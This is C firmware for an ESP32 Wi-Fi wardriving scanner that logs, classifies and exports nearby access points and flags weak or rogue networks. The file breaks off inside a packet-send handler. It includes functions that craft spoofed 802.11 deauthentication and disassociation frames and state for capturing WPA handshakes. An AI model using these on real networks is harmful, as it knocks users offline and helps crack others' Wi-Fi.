#include <string.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdint.h>
#include <inttypes.h>
#include <time.h>
#include <sys/time.h>
#include <ctype.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/event_groups.h"
#include "freertos/semphr.h"

#include "esp_random.h"
#include "esp_system.h"
#include "esp_event.h"
#include "esp_netif.h"
#include "esp_netif_ip_addr.h"
#include "esp_wifi.h"
#include "nvs_flash.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "esp_http_server.h"
#include "esp_mac.h"

static esp_err_t handler_api_handshake_start(httpd_req_t *req);
static esp_err_t handler_api_handshake_stop(httpd_req_t *req);
static esp_err_t handler_api_handshake_status(httpd_req_t *req);
static esp_err_t handler_api_wardrive_on(httpd_req_t *req);
static esp_err_t handler_api_wardrive_off(httpd_req_t *req);

static const char *TAG = "NEO_WARDRIVE";

// ========================= CONFIG ==========================

#define MAX_APS           512
#define JSON_BUF_SIZE     16384
#define SCAN_INTERVAL_MS  5000
#define CHANNEL_DWELL_MS  120

static const char *AP_SSID = "NeoWardrive";
static const char *AP_PASS = "neo_wardrive_01";

// IMPORTANT: Always use APSTA mode for scanning to work
#define ENABLE_STA_MODE false
#define STA_SSID ""
#define STA_PASS ""

// ========================= TYPES ===========================
extern const unsigned char index_html_start[] asm("_binary_index_html_start");
extern const unsigned char index_html_end[]   asm("_binary_index_html_end");

extern const unsigned char glitch_css_start[] asm("_binary_glitch_css_start");
extern const unsigned char glitch_css_end[]   asm("_binary_glitch_css_end");

extern const unsigned char app_js_start[] asm("_binary_app_js_start");
extern const unsigned char app_js_end[]   asm("_binary_app_js_end");


typedef enum {
    AP_CLASS_UNKNOWN = 0,
    AP_CLASS_HOME,
    AP_CLASS_GUEST,
    AP_CLASS_ENTERPRISE,
    AP_CLASS_HOTSPOT,
    AP_CLASS_IOT,
    AP_CLASS_SUSPECT
} ap_class_t;

static const char *ap_class_name(ap_class_t cls) {
    switch (cls) {
        case AP_CLASS_HOME:       return "Home/Office";
        case AP_CLASS_GUEST:      return "Guest Network";
        case AP_CLASS_ENTERPRISE: return "Enterprise";
        case AP_CLASS_HOTSPOT:    return "Mobile Hotspot";
        case AP_CLASS_IOT:        return "IoT/Smart Device";
        case AP_CLASS_SUSPECT:    return "Suspicious Open";
        default:                  return "Unknown";
    }
}

static const char *ap_class_detail(ap_class_t cls) {
    switch (cls) {
        case AP_CLASS_HOME:
            return "Default home/office profile";
        case AP_CLASS_GUEST:
            return "Guest/visitor SSID keywords detected";
        case AP_CLASS_ENTERPRISE:
            return "Enterprise naming or WPA3 security";
        case AP_CLASS_HOTSPOT:
            return "Likely phone hotspot identifiers";
        case AP_CLASS_IOT:
            return "IoT/camera/vendor strings spotted";
        case AP_CLASS_SUSPECT:
            return "Open high-power network with public naming";
        default:
            return "Not enough data to classify";
    }
}

typedef struct {
    bool     in_use;
    uint8_t  bssid[6];
    char     ssid[33];
    int8_t   rssi;
    uint8_t  channel;
    uint8_t  authmode;
    uint32_t first_seen_ms;
    uint32_t last_seen_ms;
    uint16_t seen_count;
    int8_t   rssi_min;
    int8_t   rssi_max;
    ap_class_t classification;
} ap_info_t;

typedef struct {
    uint32_t total_scans;
    uint32_t successful_scans;
    uint32_t failed_scans;
    uint32_t uptime_sec;
    uint32_t free_heap;
    uint32_t min_free_heap;
} stats_t;

typedef struct {
    uint32_t wep_count;
    uint32_t wpa_count;
    uint32_t wpa2_count;
    uint32_t wpa3_count;
    uint32_t open_count;
    uint32_t hidden_count;
    uint32_t weak_signal_count;
    uint32_t channel_conflicts;
} security_stats_t;

typedef struct {
    uint8_t channel;
    uint32_t ap_count;
    float congestion_score;
} channel_analysis_t;

typedef struct {
    uint32_t count;
    uint32_t last_time_ms;
    uint8_t  src[6];
    uint8_t  dst[6];
} deauth_event_t;

typedef struct {
    uint32_t packets_sent;
    bool     handshake_listening;
    uint32_t handshake_captured;
} packet_stats_t;

// ========================= STATE ===========================

static ap_info_t g_aps[MAX_APS];
static int g_ap_count = 0;
static uint32_t g_ap_insert_index = 0;

// Wardrive state
static bool      g_wardrive_enabled = false; // currently unused
static bool      g_wardrive_on      = false;
static httpd_handle_t g_httpd       = NULL;
static stats_t   g_stats            = {0};
static SemaphoreHandle_t g_ap_mutex = NULL;
static esp_netif_t *g_ap_netif      = NULL;
static esp_netif_t *g_sta_netif     = NULL;
static bool      g_sta_connected    = false;

static deauth_event_t   g_deauth_log[32];
static int              g_deauth_head = 0;
static security_stats_t g_security_stats = {0};
static packet_stats_t   g_packet_stats   = {0};

static void update_promiscuous_filter(void) {
    wifi_promiscuous_filter_t filt = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT |
                       (g_packet_stats.handshake_listening ? WIFI_PROMIS_FILTER_MASK_DATA : 0)
    };
    esp_wifi_set_promiscuous_filter(&filt);
}

// ========================= UTILS ===========================

static uint32_t now_ms(void) {
    return (uint32_t)(esp_timer_get_time() / 1000ULL);
}

static void mac_to_str(const uint8_t mac[6], char *out, size_t len) {
    snprintf(out, len, "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

static bool mac_equal(const uint8_t a[6], const uint8_t b[6]) {
    return memcmp(a, b, 6) == 0;
}

static void str_to_mac(const char *str, uint8_t mac[6]) {
    sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
}

static const char* auth_mode_to_str(wifi_auth_mode_t mode) {
    switch (mode) {
        case WIFI_AUTH_OPEN:           return "OPEN";
        case WIFI_AUTH_WEP:            return "WEP";
        case WIFI_AUTH_WPA_PSK:        return "WPA-PSK";
        case WIFI_AUTH_WPA2_PSK:       return "WPA2-PSK";
        case WIFI_AUTH_WPA_WPA2_PSK:   return "WPA/WPA2";
        case WIFI_AUTH_WPA2_ENTERPRISE:return "WPA2-ENT";
        case WIFI_AUTH_WPA3_PSK:       return "WPA3-PSK";
        case WIFI_AUTH_WPA2_WPA3_PSK:  return "WPA2/WPA3";
        default:                       return "UNKNOWN";
    }
}

static bool contains_icase(const char *haystack, const char *needle) {
    if (!haystack || !needle || !*needle) return false;
    size_t nlen = strlen(needle);

    for (const char *p = haystack; *p; p++) {
        size_t i = 0;
        while (i < nlen && p[i] &&
               (uint8_t)tolower((unsigned char)p[i]) ==
               (uint8_t)tolower((unsigned char)needle[i])) {
            i++;
        }
        if (i == nlen) return true;
    }
    return false;
}

static ap_class_t classify_ap(const ap_info_t *ap) {
    const char *s = ap->ssid;

    if (contains_icase(s, "guest") || contains_icase(s, "visitor"))
        return AP_CLASS_GUEST;

    if (contains_icase(s, "corp") || contains_icase(s, "enterprise") ||
        ap->authmode == WIFI_AUTH_WPA3_PSK)
        return AP_CLASS_ENTERPRISE;

    if (contains_icase(s, "iphone") || contains_icase(s, "androidap") ||
        contains_icase(s, "galaxy") || contains_icase(s, "hotspot"))
        return AP_CLASS_HOTSPOT;

    const char *iot[] = {"ESP", "IoT", "Cam", "Ring", "Blink", "Wyze"};
    for (int i = 0; i < 6; i++) {
        if (contains_icase(s, iot[i]))
            return AP_CLASS_IOT;
    }

    if (ap->authmode == WIFI_AUTH_OPEN &&
        (contains_icase(s, "free wifi") ||
         contains_icase(s, "public") ||
         contains_icase(s, "airport") ||
         contains_icase(s, "hotel")) &&
        ap->rssi > -40)
        return AP_CLASS_SUSPECT;

    return AP_CLASS_HOME;
}

// ========================= AP DB ===========================

static int find_ap_by_bssid(const uint8_t bssid[6]) {
    for (int i = 0; i < g_ap_count; i++) {
        if (g_aps[i].in_use && mac_equal(g_aps[i].bssid, bssid)) {
            return i;
        }
    }
    return -1;
}

static void sanitize_ssid(char *dst, const uint8_t *src, size_t max_len) {
    size_t in_len = strnlen((const char *)src, max_len);
    size_t len = 0;

    for (size_t i = 0; i < in_len; i++) {
        uint8_t c = src[i];
        dst[len++] = (c >= 32 && c < 127) ? c : '?';
        if (len >= (max_len - 1)) break;
    }
    dst[len] = 0;
}

static void update_ap_list_from_scan(void) {
    uint16_t num = 0;
    esp_wifi_scan_get_ap_num(&num);

    if (num == 0) {
        ESP_LOGW(TAG, "No APs found in scan");
        return;
    }

    wifi_ap_record_t *records = malloc(sizeof(wifi_ap_record_t) * num);
    if (!records) {
        ESP_LOGE(TAG, "Failed to allocate memory for scan results");
        return;
    }

    uint16_t actual_num = num;
    esp_err_t err = esp_wifi_scan_get_ap_records(&actual_num, records);
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "scan_get_ap_records failed: %s", esp_err_to_name(err));
        free(records);
        return;
    }

    uint32_t now = now_ms();

    if (xSemaphoreTake(g_ap_mutex, pdMS_TO_TICKS(1000)) == pdTRUE) {
        for (int i = 0; i < actual_num; i++) {
            wifi_ap_record_t *r = &records[i];

            int idx = find_ap_by_bssid(r->bssid);

            if (idx < 0) {
                idx = g_ap_insert_index++ % MAX_APS;
                ap_info_t *dst = &g_aps[idx];
                memset(dst, 0, sizeof(*dst));

                dst->in_use = true;
                memcpy(dst->bssid, r->bssid, 6);
                sanitize_ssid(dst->ssid, r->ssid, sizeof(dst->ssid));

                dst->rssi          = r->rssi;
                dst->rssi_min      = r->rssi;
                dst->rssi_max      = r->rssi;
                dst->channel       = r->primary;
                dst->authmode      = (uint8_t)r->authmode;
                dst->first_seen_ms = now;
                dst->last_seen_ms  = now;
                dst->seen_count    = 1;
                dst->classification = classify_ap(dst);

                if (g_ap_count < MAX_APS) {
                    g_ap_count++;
                }
            } else {
                ap_info_t *dst = &g_aps[idx];
                dst->rssi = r->rssi;
                if (r->rssi < dst->rssi_min) dst->rssi_min = r->rssi;
                if (r->rssi > dst->rssi_max) dst->rssi_max = r->rssi;
                dst->channel       = r->primary;
                dst->authmode      = (uint8_t)r->authmode;
                dst->last_seen_ms  = now;
                if (dst->seen_count < 0xFFFF) dst->seen_count++;

                dst->classification = classify_ap(dst);
            }
            if (idx >= g_ap_count) {
                g_ap_count = idx + 1;
            }

        }

        xSemaphoreGive(g_ap_mutex);
        ESP_LOGI(TAG, "AP list updated: %d total APs, %d in this scan", g_ap_count, actual_num);
    }

    free(records);
}

// ========================= SAFE SCAN WRAPPER ===========================

static esp_err_t safe_scan_start()
{
    // Temporarily disable promiscuous mode during scan
    esp_wifi_set_promiscuous(false);

    wifi_scan_config_t scan_cfg = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = 0,
        .show_hidden = true,
        .scan_type = WIFI_SCAN_TYPE_ACTIVE,
        .scan_time.active.min = CHANNEL_DWELL_MS,
        .scan_time.active.max = CHANNEL_DWELL_MS
    };

    esp_err_t err = esp_wifi_scan_start(&scan_cfg, true);
    
    // Re-enable promiscuous mode after scan completes
    esp_wifi_set_promiscuous(true);

    return err;
}


// ========================= CSV EXPORT =========================

static void build_csv_export(char *buf, size_t len) {
    size_t off = 0;

    off += snprintf(buf + off, len - off,
                    "SSID,BSSID,RSSI,RSSI_MIN,RSSI_MAX,Channel,Auth,Seen_Count,First_Seen_MS,Last_Seen_MS\n");

    if (xSemaphoreTake(g_ap_mutex, pdMS_TO_TICKS(1000)) == pdTRUE) {
        for (int i = 0; i < g_ap_count && off < len - 256; i++) {
            ap_info_t *ap = &g_aps[i];
            if (!ap->in_use) continue;

            char bssid_str[18];
            mac_to_str(ap->bssid, bssid_str, sizeof(bssid_str));

            const char *ssid_display = ap->ssid[0] ? ap->ssid : "<hidden>";

            off += snprintf(buf + off, len - off,
                            "\"%s\",%s,%d,%d,%d,%u,%s,%u,%lu,%lu\n",
                            ssid_display,
                            bssid_str,
                            (int)ap->rssi,
                            (int)ap->rssi_min,
                            (int)ap->rssi_max,
                            (unsigned)ap->channel,
                            auth_mode_to_str(ap->authmode),
                            (unsigned)ap->seen_count,
                            (unsigned long)ap->first_seen_ms,
                            (unsigned long)ap->last_seen_ms);
        }
        xSemaphoreGive(g_ap_mutex);
    }
}

// ========================= SECURITY ANALYSIS FUNCTIONS =========================

static void analyze_security(void) {
    memset(&g_security_stats, 0, sizeof(g_security_stats));

    if (xSemaphoreTake(g_ap_mutex, pdMS_TO_TICKS(1000)) == pdTRUE) {
        for (int i = 0; i < g_ap_count; i++) {
            ap_info_t *ap = &g_aps[i];
            if (!ap->in_use) continue;

            switch (ap->authmode) {
                case WIFI_AUTH_OPEN:
                    g_security_stats.open_count++;
                    break;
                case WIFI_AUTH_WEP:
                    g_security_stats.wep_count++;
                    break;
                case WIFI_AUTH_WPA_PSK:
                    g_security_stats.wpa_count++;
                    break;
                case WIFI_AUTH_WPA2_PSK:
                case WIFI_AUTH_WPA_WPA2_PSK:
                    g_security_stats.wpa2_count++;
                    break;
                case WIFI_AUTH_WPA3_PSK:
                case WIFI_AUTH_WPA2_WPA3_PSK:
                    g_security_stats.wpa3_count++;
                    break;
            }

            if (ap->ssid[0] == '\0') {
                g_security_stats.hidden_count++;
            }

            if (ap->rssi < -70) {
                g_security_stats.weak_signal_count++;
            }
        }

        int channel_counts[14] = {0};
        for (int i = 0; i < g_ap_count; i++) {
            if (g_aps[i].in_use && g_aps[i].channel >= 1 && g_aps[i].channel <= 13) {
                channel_counts[g_aps[i].channel]++;
            }
        }

        for (int ch = 1; ch <= 13; ch++) {
            if (channel_counts[ch] >= 3) {
                g_security_stats.channel_conflicts++;
            }
        }

        xSemaphoreGive(g_ap_mutex);
    }
}

static void get_channel_congestion(channel_analysis_t *results, int *count) {
    int channel_counts[14] = {0};
    *count = 0;

    if (xSemaphoreTake(g_ap_mutex, pdMS_TO_TICKS(1000)) == pdTRUE) {
        for (int i = 0; i < g_ap_count; i++) {
            if (g_aps[i].in_use && g_aps[i].channel >= 1 && g_aps[i].channel <= 13) {
                channel_counts[g_aps[i].channel]++;
            }
        }

        int max_aps = 1;
        for (int ch = 1; ch <= 13; ch++) {
            if (channel_counts[ch] > max_aps) {
                max_aps = channel_counts[ch];
            }
        }

        for (int ch = 1; ch <= 13; ch++) {
            results[*count].channel = ch;
            results[*count].ap_count = channel_counts[ch];
            results[*count].congestion_score =
                (max_aps > 0) ? (channel_counts[ch] * 100.0f / max_aps) : 0.0f;
            (*count)++;
        }

        xSemaphoreGive(g_ap_mutex);
    }
}

static void detect_rogue_aps(char *buf, size_t len) {
    size_t off = 0;
    off += snprintf(buf + off, len - off, "[");

    bool first = true;

    if (xSemaphoreTake(g_ap_mutex, pdMS_TO_TICKS(1000)) == pdTRUE) {
        for (int i = 0; i < g_ap_count; i++) {
            ap_info_t *ap = &g_aps[i];
            if (!ap->in_use) continue;

            bool is_suspicious = false;
            char reason[128] = "";

            for (int j = i + 1; j < g_ap_count; j++) {
                if (g_aps[j].in_use &&
                    strlen(ap->ssid) > 0 &&
                    strcmp(ap->ssid, g_aps[j].ssid) == 0 &&
                    !mac_equal(ap->bssid, g_aps[j].bssid)) {
                    is_suspicious = true;
                    snprintf(reason, sizeof(reason),
                             "Duplicate SSID - Possible Evil Twin");
                    break;
                }
            }

            if (ap->authmode == WIFI_AUTH_OPEN && strlen(ap->ssid) > 0) {
                const char *common_names[] = {
                    "Free WiFi", "Public WiFi", "Guest", "Airport WiFi", "Hotel WiFi"
                };
                for (int k = 0; k < 5; k++) {
                    if (strcasecmp(ap->ssid, common_names[k]) == 0) {
                        is_suspicious = true;
                        snprintf(reason, sizeof(reason),
                                 "Open network with generic name");
                        break;
                    }
                }
            }

            if (is_suspicious && off < len - 256) {
                if (!first) off += snprintf(buf + off, len - off, ",");
                first = false;

                char bssid_str[18];
                mac_to_str(ap->bssid, bssid_str, sizeof(bssid_str));

                off += snprintf(buf + off, len - off,
                                "{\"ssid\":\"%s\",\"bssid\":\"%s\","
                                "\"reason\":\"%s\",\"rssi\":%d,\"channel\":%u}",
                                ap->ssid[0] ? ap->ssid : "<hidden>",
                                bssid_str,
                                reason,
                                (int)ap->rssi,
                                (unsigned)ap->channel);
            }
        }

        xSemaphoreGive(g_ap_mutex);
    }

    off += snprintf(buf + off, len - off, "]");
}

static void get_vulnerable_networks(char *buf, size_t len) {
    size_t off = 0;
    off += snprintf(buf + off, len - off, "[");

    bool first = true;

    if (xSemaphoreTake(g_ap_mutex, pdMS_TO_TICKS(1000)) == pdTRUE) {
        for (int i = 0; i < g_ap_count && off < len - 256; i++) {
            ap_info_t *ap = &g_aps[i];
            if (!ap->in_use) continue;

            bool is_vulnerable = false;
            char vulnerability[128] = "";
            char severity[16] = "";

            if (ap->authmode == WIFI_AUTH_WEP) {
                is_vulnerable = true;
                snprintf(vulnerability, sizeof(vulnerability),
                         "WEP encryption (deprecated, easily cracked)");
                snprintf(severity, sizeof(severity), "CRITICAL");
            } else if (ap->authmode == WIFI_AUTH_WPA_PSK) {
                is_vulnerable = true;
                snprintf(vulnerability, sizeof(vulnerability),
                         "WPA1 encryption (deprecated, vulnerable)");
                snprintf(severity, sizeof(severity), "HIGH");
            } else if (ap->authmode == WIFI_AUTH_OPEN) {
                is_vulnerable = true;
                snprintf(vulnerability, sizeof(vulnerability),
                         "No encryption (unprotected network)");
                snprintf(severity, sizeof(severity), "HIGH");
            }

            if (is_vulnerable) {
                if (!first) off += snprintf(buf + off, len - off, ",");
                first = false;

                char bssid_str[18];
                mac_to_str(ap->bssid, bssid_str, sizeof(bssid_str));

                off += snprintf(buf + off, len - off,
                                "{\"ssid\":\"%s\",\"bssid\":\"%s\",\"vulnerability\":\"%s\","
                                "\"severity\":\"%s\",\"auth\":\"%s\",\"rssi\":%d,\"channel\":%u}",
                                ap->ssid[0] ? ap->ssid : "<hidden>",
                                bssid_str,
                                vulnerability,
                                severity,
                                auth_mode_to_str(ap->authmode),
                                (int)ap->rssi,
                                (unsigned)ap->channel);
            }
        }

        xSemaphoreGive(g_ap_mutex);
    }

    off += snprintf(buf + off, len - off, "]");
}

// ========================= PACKET INJECTION FUNCTIONS =========================

static void craft_deauth_frame(uint8_t *frame, const uint8_t *target_mac, const uint8_t *ap_mac) {
    frame[0] = 0xC0;
    frame[1] = 0x00;

    frame[2] = 0x00;
    frame[3] = 0x00;

    memcpy(&frame[4],  target_mac, 6);
    memcpy(&frame[10], ap_mac,     6);
    memcpy(&frame[16], ap_mac,     6);

    frame[22] = 0x00;
    frame[23] = 0x00;

    frame[24] = 0x07;
    frame[25] = 0x00;
}

static void craft_disassoc_frame(uint8_t *frame, const uint8_t *target_mac, const uint8_t *ap_mac) {
    frame[0] = 0xA0;
    frame[1] = 0x00;

    frame[2] = 0x00;
    frame[3] = 0x00;

    memcpy(&frame[4],  target_mac, 6);
    memcpy(&frame[10], ap_mac,     6);
    memcpy(&frame[16], ap_mac,     6);

    frame[22] = 0x00;
    frame[23] = 0x00;

    frame[24] = 0x08;
    frame[25] = 0x00;
}

static void craft_probe_request(uint8_t *frame, size_t *len, const char *ssid) {
    int idx = 0;

    frame[idx++] = 0x40;
    frame[idx++] = 0x00;

    frame[idx++] = 0x00;
    frame[idx++] = 0x00;

    memset(&frame[idx], 0xFF, 6);
    idx += 6;

    frame[idx++] = 0x02;
    for (int i = 1; i < 6; i++) {
        frame[idx++] = esp_random() & 0xFF;
    }

    memset(&frame[idx], 0xFF, 6);
    idx += 6;

    frame[idx++] = 0x00;
    frame[idx++] = 0x00;

    frame[idx++] = 0x00;
    uint8_t ssid_len = (uint8_t)strlen(ssid);
    frame[idx++] = ssid_len;
    memcpy(&frame[idx], ssid, ssid_len);
    idx += ssid_len;

    *len = idx;
}

// ========================= HTML UI =========================

static esp_err_t handler_root(httpd_req_t *req) {
    const size_t html_size = index_html_end - index_html_start;

    httpd_resp_set_type(req, "text/html");
    return httpd_resp_send(req, (const char *)index_html_start, html_size);
}

static esp_err_t handler_api_aps(httpd_req_t *req) {
    char *json_buf = malloc(JSON_BUF_SIZE);
    if (!json_buf) {
        httpd_resp_send_500(req);
        return ESP_FAIL;
    }
    size_t off = 0;
    off += snprintf(json_buf + off, JSON_BUF_SIZE - off, "[");

    uint32_t now = now_ms();

    if (xSemaphoreTake(g_ap_mutex, pdMS_TO_TICKS(1000)) == pdTRUE) {
        bool first = true;
        for (int i = 0; i < g_ap_count && off < JSON_BUF_SIZE - 512; i++) {
            ap_info_t *ap = &g_aps[i];
            if (!ap->in_use) continue;

            if (!first) {
                off += snprintf(json_buf + off, JSON_BUF_SIZE - off, ",");
            }
            first = false;

            char bssid_str[18];
            mac_to_str(ap->bssid, bssid_str, sizeof(bssid_str));

            uint32_t age = now - ap->last_seen_ms;

            off += snprintf(json_buf + off, JSON_BUF_SIZE - off,
                            "{\"ssid\":\"%s\",\"bssid\":\"%s\",\"rssi\":%d,"
                            "\"rssi_min\":%d,\"rssi_max\":%d,\"channel\":%u,"
                            "\"auth\":%u,\"auth_str\":\"%s\",\"seen\":%u,"
                            "\"first_seen\":%lu,\"last_seen\":%lu,\"age_ms\":%lu}",
                            ap->ssid[0] ? ap->ssid : "<hidden>",
                            bssid_str,
                            (int)ap->rssi,
                            (int)ap->rssi_min,
                            (int)ap->rssi_max,
                            (unsigned)ap->channel,
                            (unsigned)ap->authmode,
                            auth_mode_to_str(ap->authmode),
                            (unsigned)ap->seen_count,
                            (unsigned long)ap->first_seen_ms,
                            (unsigned long)ap->last_seen_ms,
                            (unsigned long)age);
        }
        xSemaphoreGive(g_ap_mutex);
    }

    off += snprintf(json_buf + off, JSON_BUF_SIZE - off, "]");

    httpd_resp_set_type(req, "application/json");
    esp_err_t ret = httpd_resp_send(req, json_buf, off);
    free(json_buf);
    return ret;
}

static esp_err_t handler_api_state(httpd_req_t *req) {
    char buf[512];
    g_stats.uptime_sec   = (uint32_t)(esp_timer_get_time() / 1000000ULL);
    g_stats.free_heap    = esp_get_free_heap_size();
    g_stats.min_free_heap = esp_get_minimum_free_heap_size();

    snprintf(buf, sizeof(buf),
             "{\"wardrive\":%s,\"ap_count\":%d,\"total_scans\":%lu,"
             "\"successful_scans\":%lu,\"failed_scans\":%lu,"
             "\"uptime_sec\":%lu,\"free_heap\":%lu,\"min_free_heap\":%lu,"
             "\"packets_sent\":%lu,\"handshake_listening\":%s,\"handshake_captured\":%lu}",
             g_wardrive_on ? "true" : "false",
             g_ap_count,
             (unsigned long)g_stats.total_scans,
             (unsigned long)g_stats.successful_scans,
             (unsigned long)g_stats.failed_scans,
             (unsigned long)g_stats.uptime_sec,
             (unsigned long)g_stats.free_heap,
             (unsigned long)g_stats.min_free_heap,
             (unsigned long)g_packet_stats.packets_sent,
             g_packet_stats.handshake_listening ? "true" : "false",
             (unsigned long)g_packet_stats.handshake_captured);

    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, buf, HTTPD_RESP_USE_STRLEN);
}

static esp_err_t handler_api_channels(httpd_req_t *req) {
    char buf[2048];
    size_t off = 0;
    int channel_count[14] = {0};

    if (xSemaphoreTake(g_ap_mutex, pdMS_TO_TICKS(1000)) == pdTRUE) {
        for (int i = 0; i < g_ap_count; i++) {
            if (g_aps[i].in_use && g_aps[i].channel >= 1 && g_aps[i].channel <= 13) {
                channel_count[g_aps[i].channel]++;
            }
        }
        xSemaphoreGive(g_ap_mutex);
    }

    off += snprintf(buf + off, sizeof(buf) - off, "[");
    bool first = true;
    for (int ch = 1; ch <= 13; ch++) {
        if (!first) off += snprintf(buf + off, sizeof(buf) - off, ",");
        first = false;
        off += snprintf(buf + off, sizeof(buf) - off,
                        "{\"ch\":%d,\"count\":%d}", ch, channel_count[ch]);
    }
    off += snprintf(buf + off, sizeof(buf) - off, "]");

    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, buf, off);
}

static esp_err_t handler_api_clear(httpd_req_t *req) {
    if (xSemaphoreTake(g_ap_mutex, pdMS_TO_TICKS(1000)) == pdTRUE) {
        memset(g_aps, 0, sizeof(g_aps));
        g_ap_count = 0;
        g_ap_insert_index = 0;
        xSemaphoreGive(g_ap_mutex);
    }
    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, "{\"status\":\"ok\"}", HTTPD_RESP_USE_STRLEN);
}

static esp_err_t handler_api_scan_once(httpd_req_t *req) {
    g_stats.total_scans++;

    if (safe_scan_start() == ESP_OK) {
        g_stats.successful_scans++;
        update_ap_list_from_scan();
    } else {
        g_stats.failed_scans++;
    }

    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, "{\"status\":\"ok\"}", HTTPD_RESP_USE_STRLEN);
}


static esp_err_t handler_api_export_csv(httpd_req_t *req) {
    char *csv_buf = malloc(JSON_BUF_SIZE);
    if (!csv_buf) {
        httpd_resp_send_500(req);
        return ESP_FAIL;
    }
    build_csv_export(csv_buf, JSON_BUF_SIZE);

    httpd_resp_set_type(req, "text/csv");
    httpd_resp_set_hdr(req, "Content-Disposition",
                       "attachment; filename=wardrive.csv");
    esp_err_t ret = httpd_resp_send(req, csv_buf, strlen(csv_buf));
    free(csv_buf);
    return ret;
}

static esp_err_t handler_api_security_analysis(httpd_req_t *req) {
    analyze_security();
    char buf[1024];
    snprintf(buf, sizeof(buf),
             "{\"wep_count\":%lu,\"wpa_count\":%lu,\"wpa2_count\":%lu,"
             "\"wpa3_count\":%lu,\"open_count\":%lu,\"hidden_count\":%lu,"
             "\"weak_signal_count\":%lu,\"channel_conflicts\":%lu}",
             (unsigned long)g_security_stats.wep_count,
             (unsigned long)g_security_stats.wpa_count,
             (unsigned long)g_security_stats.wpa2_count,
             (unsigned long)g_security_stats.wpa3_count,
             (unsigned long)g_security_stats.open_count,
             (unsigned long)g_security_stats.hidden_count,
             (unsigned long)g_security_stats.weak_signal_count,
             (unsigned long)g_security_stats.channel_conflicts);

    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, buf, HTTPD_RESP_USE_STRLEN);
}

static esp_err_t handler_api_channel_congestion(httpd_req_t *req) {
    channel_analysis_t analysis[13];
    int count = 0;
    get_channel_congestion(analysis, &count);

    char *buf = malloc(4096);
    if (!buf) {
        httpd_resp_send_500(req);
        return ESP_FAIL;
    }

    size_t off = 0;
    off += snprintf(buf + off, 4096 - off, "[");

    for (int i = 0; i < count; i++) {
        if (i > 0) off += snprintf(buf + off, 4096 - off, ",");
        off += snprintf(buf + off, 4096 - off,
                        "{\"channel\":%u,\"ap_count\":%lu,\"congestion\":%.1f}",
                        (unsigned)analysis[i].channel,
                        (unsigned long)analysis[i].ap_count,
                        analysis[i].congestion_score);
    }

    off += snprintf(buf + off, 4096 - off, "]");

    httpd_resp_set_type(req, "application/json");
    esp_err_t ret = httpd_resp_send(req, buf, off);
    free(buf);
    return ret;
}

static esp_err_t handler_api_rogue_detection(httpd_req_t *req) {
    char *buf = malloc(8192);
    if (!buf) {
        httpd_resp_send_500(req);
        return ESP_FAIL;
    }
    detect_rogue_aps(buf, 8192);

    httpd_resp_set_type(req, "application/json");
    esp_err_t ret = httpd_resp_send(req, buf, strlen(buf));
    free(buf);
    return ret;
}

static esp_err_t handler_api_vulnerabilities(httpd_req_t *req) {
    char *buf = malloc(8192);
    if (!buf) {
        httpd_resp_send_500(req);
        return ESP_FAIL;
    }
    get_vulnerable_networks(buf, 8192);

    httpd_resp_set_type(req, "application/json");
    esp_err_t ret = httpd_resp_send(req, buf, strlen(buf));
    free(buf);
    return ret;
}

static esp_err_t handler_api_classifications(httpd_req_t *req) {
    char *buf = malloc(JSON_BUF_SIZE);
    if (!buf) {
        httpd_resp_send_500(req);
        return ESP_FAIL;
    }
    size_t off = 0;
    off += snprintf(buf + off, JSON_BUF_SIZE - off, "[");

    if (xSemaphoreTake(g_ap_mutex, pdMS_TO_TICKS(1000)) == pdTRUE) {
        bool first = true;
        for (int i = 0; i < g_ap_count && off < JSON_BUF_SIZE - 256; i++) {
            ap_info_t *ap = &g_aps[i];
            if (!ap->in_use) continue;

            if (!first) off += snprintf(buf + off, JSON_BUF_SIZE - off, ",");
            first = false;

            char bssid_str[18];
            mac_to_str(ap->bssid, bssid_str, sizeof(bssid_str));

            off += snprintf(buf + off, JSON_BUF_SIZE - off,
                            "{\"ssid\":\"%s\",\"bssid\":\"%s\","
                            "\"class_id\":%d,\"class_name\":\"%s\",\"class_detail\":\"%s\"," 
                            "\"rssi\":%d,\"channel\":%u}",
                            ap->ssid[0] ? ap->ssid : "<hidden>",
                            bssid_str,
                            ap->classification,
                            ap_class_name(ap->classification),
                            ap_class_detail(ap->classification),
                            (int)ap->rssi,
                            (unsigned)ap->channel);
        }
        xSemaphoreGive(g_ap_mutex);
    }

    off += snprintf(buf + off, JSON_BUF_SIZE - off, "]");

    httpd_resp_set_type(req, "application/json");
    esp_err_t r = httpd_resp_send(req, buf, off);
    free(buf);
    return r;
}

static esp_err_t handler_api_deauth(httpd_req_t *req) {
    char *buf = malloc(4096);
    if (!buf) {
        httpd_resp_send_500(req);
        return ESP_FAIL;
    }
    size_t off = 0;
    off += snprintf(buf + off, 4096 - off, "[");

    bool first = true;
    for (int i = 0; i < 32; i++) {
        deauth_event_t *ev = &g_deauth_log[i];
        if (!ev->count) continue;

        char src[18], dst[18];
        mac_to_str(ev->src, src, sizeof(src));
        mac_to_str(ev->dst, dst, sizeof(dst));

        if (!first) off += snprintf(buf + off, 4096 - off, ",");
        first = false;

        off += snprintf(buf + off, 4096 - off,
                        "{\"src\":\"%s\",\"dst\":\"%s\",\"count\":%" PRIu32 ","
                        "\"last_ms\":%" PRIu32 "}",
                        src, dst, ev->count, ev->last_time_ms);
    }

    off += snprintf(buf + off, 4096 - off, "]");

    httpd_resp_set_type(req, "application/json");
    esp_err_t ret = httpd_resp_send(req, buf, off);
    free(buf);
    return ret;
}

static esp_err_t handler_api_packets_send(httpd_req_t *req) {
    char buf[512];
    int len = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (len <= 0) {
        httpd_resp_send_500(req);
        return ESP_FAIL;
    }
